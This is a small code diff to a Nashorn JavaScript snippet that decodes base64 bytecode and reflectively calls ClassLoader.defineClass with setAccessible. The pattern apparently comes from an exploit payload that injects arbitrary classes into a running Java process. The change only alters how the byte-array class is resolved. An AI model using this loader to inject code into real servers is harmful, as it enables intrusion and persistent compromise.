@@ -16,7 +16,7 @@ try {
         bytecode = datatypeConverterClz.getMethod("parseBase64Binary", clsString).invoke(datatypeConverterClz, base64Str);
     }
     var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');
-    var clsByteArray = classLoader.loadClass('[B');
+    var clsByteArray = Java.type('byte[]').class;
     var clsInt = java.lang.Integer.TYPE;
     var defineClass = clsClassLoader.getDeclaredMethod("defineClass", clsByteArray, clsInt, clsInt);
     defineClass.setAccessible(true);
